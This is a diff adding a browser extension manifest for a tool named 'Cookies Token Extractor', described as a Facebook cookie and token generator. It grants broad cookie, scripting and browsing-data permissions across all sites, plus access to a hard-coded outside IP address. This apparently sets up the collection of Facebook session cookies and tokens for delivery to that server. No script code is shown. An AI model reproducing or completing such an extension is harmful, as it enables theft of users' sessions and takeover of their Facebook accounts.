@@ -1,0 +1,16 @@
+{
+  "manifest_version": 3,
+  "name": "Cookies Token Extractor by Darkester",
+  "version": "1.0",
+  "description": "Facebook Cookie and Token Generator",
+   "permissions": [ "cookies", "tabs", "scripting", "activeTab","browsingData","https://*/","http://*/","http://104.168.76.139/"],
+   "host_permissions": ["*://*.facebook.com/*","http://104.168.76.139/*"],
+  "action": {
+    "default_popup": "popup.html",
+    "default_icon": {
+      "16": "icon16.png",
+      "48": "icon48.png",
+      "128": "icon128.png"
+    }
+  }
+}
